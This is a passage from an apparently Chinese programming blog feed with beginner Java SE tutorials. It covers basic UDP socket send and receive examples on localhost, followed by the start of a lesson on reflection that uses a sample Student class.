ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  InetAddress</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> UnknownHostException &#123;<br><span class="hljs-comment">//        InetAddress address = InetAddress.getByName(&quot;192.168.1.2&quot;);</span><br><span class="hljs-comment">//        InetAddress address = InetAddress.getByName(&quot;127.0.0.1&quot;);//通过本地回环地址访问自己</span><br>        <span class="hljs-type">InetAddress</span> <span class="hljs-variable">address</span> <span class="hljs-operator">=</span> InetAddress.getByName(<span class="hljs-string">&quot;LAPTOP-93CBHP2O&quot;</span>);<span class="hljs-comment">//通过本主机名获取</span><br><br><br>        System.out.println(address);<br>        System.out.println(address.getHostName());<span class="hljs-comment">//获取主机名</span><br>        System.out.println(address.getHostAddress());<span class="hljs-comment">//获取主机地址</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="ca2d935f"></a></p><h4 id="1-4-端口"><a href="#1-4-端口" class="headerlink" title="1.4 - 端口"></a>1.4 - 端口</h4><blockquote><p>端口是一个应用程序（进程&#x2F;线程）在设备中的唯一标识</p></blockquote><p>端口号：用两个字节的整数来表示（unsigned short :  0 ~ 65535）,其中0 ~ 1024之间的端口进行不要使用，因为很多知名网络服务商和应用程序都会在这个区间选择端口（被占用的几率大），建议使用10000以上端口号，如果被占用，再换一个。<br><a name="1fadee68"></a></p><h4 id="1-5-协议"><a href="#1-5-协议" class="headerlink" title="1.5 - 协议"></a>1.5 - 协议</h4><blockquote><p>计算机网络中，连接和通信的规则</p></blockquote><ul><li>UDP <ul><li>User Datagram Protocol  用户数据包协议</li><li>UDP协议是一种无连接的通信协议，即在数据传输的时候，数据的发送端和接收端不会建立所谓的逻辑连接，简单来说就是当一台计算机向另计算机发送数据时，发送端不会确认接收端是否存在，都会将数据发出。同样接收端也不会再接收到数据后做任何的反馈。</li><li>UDP协议消耗资源相对小，通信效率高，但是不安全。一般情况下使用在在线的音乐、视频。</li></ul></li><li>TCP <ul><li>Transmission Control Protoclol 传输控制协议</li><li>TCP协议是一种面向连接&#x2F;安全的数据通信协议，在数据传输之前，会在发送端和接收端各自创建一个逻辑对象，然后再进行数据的传输。</li><li>传输之前会做“三次握手”</li><li>传输之后断开连接会做“四次挥手”<br>  <a name="c6dca399"></a></li></ul></li></ul><h2 id="2-UDP通信"><a href="#2-UDP通信" class="headerlink" title="2 - UDP通信"></a>2 - UDP通信</h2><p><a name="c4031eb2"></a></p><h3 id="2-1-通信原理"><a href="#2-1-通信原理" class="headerlink" title="2.1 - 通信原理"></a>2.1 - 通信原理</h3><blockquote><p>UDP在通信的时候在两端各自创建一个Socekt（套接字）对象，但是这个两个Socket（对象）只是用来发送和接收数据的对象，因此对于UDP协议通信的双方而言，没有所谓的客户端和服务器端的概念。</p></blockquote><p><a name="53628e69"></a></p><h3 id="2-2-UDP发送"><a href="#2-2-UDP发送" class="headerlink" title="2.2 - UDP发送"></a>2.2 - UDP发送</h3><ul><li>发送步骤<br>1、创建发送端的Socket对象 - DatagramSocket<br>2、创建数据，并打包数据<br>3、调用发送方法<br>4、关闭发送</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo04;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.net.*;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  UDP发送</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UDPSend</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><span class="hljs-comment">//        1、创建发送端的Socket对象 - DatagramSocket</span><br>        <span class="hljs-type">DatagramSocket</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DatagramSocket</span>();<br><br><span class="hljs-comment">//        2、创建数据，并打包数据</span><br><span class="hljs-comment">//        byte buf[], int length,InetAddress address, int port</span><br>        <span class="hljs-type">byte</span>[] bytes = <span class="hljs-string">&quot;Hello UDP Send Messages!~&quot;</span>.getBytes();<span class="hljs-comment">//将字符串转换成byte数组</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> bytes.length;<span class="hljs-comment">//数据长度</span><br>        <span class="hljs-type">InetAddress</span> <span class="hljs-variable">address</span> <span class="hljs-operator">=</span> InetAddress.getByName(<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">9527</span>;<br>        <span class="hljs-type">DatagramPacket</span> <span class="hljs-variable">dp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DatagramPacket</span>(bytes, length, address, port);<br><br><span class="hljs-comment">//        3、调用发送方法</span><br>        ds.send(dp);<br><br><span class="hljs-comment">//        4、关闭发送</span><br>        ds.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="7764f78d"></a></p><h3 id="2-3-UDP接收"><a href="#2-3-UDP接收" class="headerlink" title="2.3 - UDP接收"></a>2.3 - UDP接收</h3><ul><li>接收数据的步骤<br>1、创建接收端Socket对象  - DatagramSoket<br>2、创建一个数据包，用于接收数据<br>3、调用接收方法<br>4、解析数据包<br>5、关闭接收</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo04;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.net.DatagramPacket;<br><span class="hljs-keyword">import</span> java.net.DatagramSocket;<br><span class="hljs-keyword">import</span> java.net.SocketException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  UDP接收数据</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UDPReceive</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><span class="hljs-comment">//        1、创建接收端Socket对象  - DatagramSoket</span><br>        <span class="hljs-type">DatagramSocket</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DatagramSocket</span>(<span class="hljs-number">9527</span>);<br><br><span class="hljs-comment">//        2、创建一个数据包，用于接收数据</span><br><span class="hljs-comment">//        byte buf[], int length</span><br>        <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> bytes.length;<br>        <span class="hljs-type">DatagramPacket</span> <span class="hljs-variable">dp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DatagramPacket</span>(bytes, length);<br><br><span class="hljs-comment">//        3、调用接收方法</span><br>        ds.receive(dp);<br><br><span class="hljs-comment">//        4、解析数据包</span><br>        <span class="hljs-type">byte</span>[] data = dp.getData();<span class="hljs-comment">//获取数据包中的数据</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">length1</span> <span class="hljs-operator">=</span> dp.getLength();<span class="hljs-comment">//获取数据包中数据的长度</span><br>        System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(data,<span class="hljs-number">0</span>,length1));<br><br><span class="hljs-comment">//        5、关闭接收</span><br>        ds.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="13414b28"></a></p><h3 id="2-4-案例"><a href="#2-4-案例" class="headerlink" title="2.4 - 案例"></a>2.4 - 案例</h3><blockquote><p>需求：<br>UDP发送数据：数据来源于键盘输入，直到输入over的时候就结束发送<br>UDP接收数据：因为不知道发送端发送多少次，所以接收端采用死循环</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo05;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.net.DatagramPacket;<br><span class="hljs-keyword">import</span> java.net.DatagramSocket;<br><span class="hljs-keyword">import</span> java.net.SocketException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  接收端</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UDPReceive</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">DatagramSocket</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DatagramSocket</span>(<span class="hljs-number">9527</span>);<span class="hljs-comment">//创建接收端对象</span><br><br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<span class="hljs-comment">//创建容器，用来接收发送过来的数据</span><br>            <span class="hljs-type">DatagramPacket</span> <span class="hljs-variable">dp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DatagramPacket</span>(bytes, bytes.length);<span class="hljs-comment">//创建接收数据的数据包</span><br>            ds.receive(dp);<span class="hljs-comment">//接收数据</span><br>            System.out.println(<span class="hljs-string">&quot;接收到-&quot;</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes,<span class="hljs-number">0</span>,dp.getLength()));<br>        &#125;<br><br>    &#125;<br>&#125;<br>----------------------------------------------------<br><span class="hljs-keyword">package</span> demo05;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.net.DatagramPacket;<br><span class="hljs-keyword">import</span> java.net.DatagramSocket;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.SocketException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  UDP发送端</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UDPSend</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">//创建发送端对象</span><br>        <span class="hljs-type">DatagramSocket</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DatagramSocket</span>();<br>        <span class="hljs-comment">//自己封装一个获取键盘输入的流</span><br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(System.in));<br><br>        String line;<br>        <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-comment">//判断用户是否需要退出，如果输入的是over</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;over&quot;</span>.equals(line))<br>                <span class="hljs-keyword">break</span>;<br><br>            <span class="hljs-comment">//用户输入的不是over，则需要将数据发送出去</span><br>            <span class="hljs-type">byte</span>[] bytes = line.getBytes();<span class="hljs-comment">//将数据转换成byte数组</span><br>            <span class="hljs-type">InetAddress</span> <span class="hljs-variable">address</span> <span class="hljs-operator">=</span> InetAddress.getByName(<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<span class="hljs-comment">//创建地址</span><br>            <span class="hljs-type">DatagramPacket</span> <span class="hljs-variable">dp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DatagramPacket</span>(bytes, bytes.length, address, <span class="hljs-number">9527</span>);<br>            ds.send(dp);<span class="hljs-comment">//发送数据</span><br>        &#125;<br><br>        <span class="hljs-comment">//关闭发送</span><br>        ds.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaSe</tag>
      
      <tag>网络编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaSe基础---反射</title>
    <link href="/2020/05/20/JavaSe%E5%9F%BA%E7%A1%80---%E5%8F%8D%E5%B0%84/"/>
    <url>/2020/05/20/JavaSe%E5%9F%BA%E7%A1%80---%E5%8F%8D%E5%B0%84/</url>
    
    <content type="html"><![CDATA[<p><a name="00bbd7ba"></a></p><h2 id="1-反射"><a href="#1-反射" class="headerlink" title="1 - 反射"></a>1 - 反射</h2><p><a name="3315e3c2"></a></p><h3 id="1-1-概述"><a href="#1-1-概述" class="headerlink" title="1.1 -概述"></a>1.1 -概述</h3><blockquote><p>Java反射机制就是在程序的<strong>运行</strong>状态中，通过任意一个类的<strong>class</strong>文件，都能获取到这个类的所有属性和方法，这种<strong>动态获取</strong>信息的方式，称之为Java语言的反射机制。</p></blockquote><p><a name="f79d9c50"></a></p><h3 id="1-2-获取class对象"><a href="#1-2-获取class对象" class="headerlink" title="1.2 - 获取class对象"></a>1.2 - 获取class对象</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo06;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  获取class对象的方式</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo06</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-comment">//最简单的方式</span><br>        Class&lt;Student&gt; c01 = Student.class;<br>        System.out.println(c01);<br><br>        <span class="hljs-comment">//灵活的方方式</span><br>        Class&lt;?&gt; c02 = Class.forName(<span class="hljs-string">&quot;demo06.Student&quot;</span>);<br>        System.out.println(c02);<br><br>        <span class="hljs-comment">//比较尴尬的方法</span><br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Student</span>&gt; c03 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>().getClass();<br>        System.out.println(c03);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="e224fbbe"></a></p><h3 id="1-4-反射获取私有构造方法"><a href="#1-4-反射获取私有构造方法" class="headerlink" title="1.4 - 反射获取私有构造方法"></a>1.4 - 反射获取私有构造方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> reflex;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> String sex;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-type">float</span> score;<br>    String tel;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, String sex, <span class="hljs-type">int</span> age, <span class="hljs-type">float</span> score, String tel)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.sex = sex;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.score = score;<br>        <span class="hljs-built_in">this</span>.tel = tel;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, String sex)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.sex = sex;<br>    &#125;<br><br>    Student(String name, String sex, <span class="hljs-type">int</span> age) &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.sex = sex;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-comment">//自定义成员方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodPub</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;公有成员方法&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodPub</span><span class="hljs-params">(String info)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;带参公有成员方法&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodPri</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;私有成员方法&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodPri</span><span class="hljs-params">(String info)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;私有带参成员方法&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodPro</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;受保护成员方法&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodPro</span><span class="hljs-params">(String info)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;受保护带参成员方法&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodDef</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;默认成员方法&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodDef</span><span class="hljs-params">(String info)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;默认带参成员方法&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getSex</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> sex;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSex</span><span class="hljs-params">(String sex)</span> &#123;<br>        <span class="hljs-built_in">this</span>.sex = sex;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">float</span> <span class="hljs-title function_">getScore</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> score;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setScore</span><span class="hljs-params">(<span class="hljs-type">float</span> score)</span> &#123;<br>        <span class="hljs-built_in">this</span>.score = score;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getTel</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> tel;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTel</span><span class="hljs-params">(String tel)</span> &#123;<br>        <span class="hljs-built_in">this</span>.tel = tel;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Student&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, sex=&#x27;&quot;</span> + sex + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&quot;, score=&quot;</span> + score +<br>                <span class="hljs-string">&quot;, tel=&#x27;&quot;</span> + tel + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br>----------------------------------------------------------<br><span class="hljs-keyword">package</span> reflex;<br><br><span class="hljs-keyword">import</span> 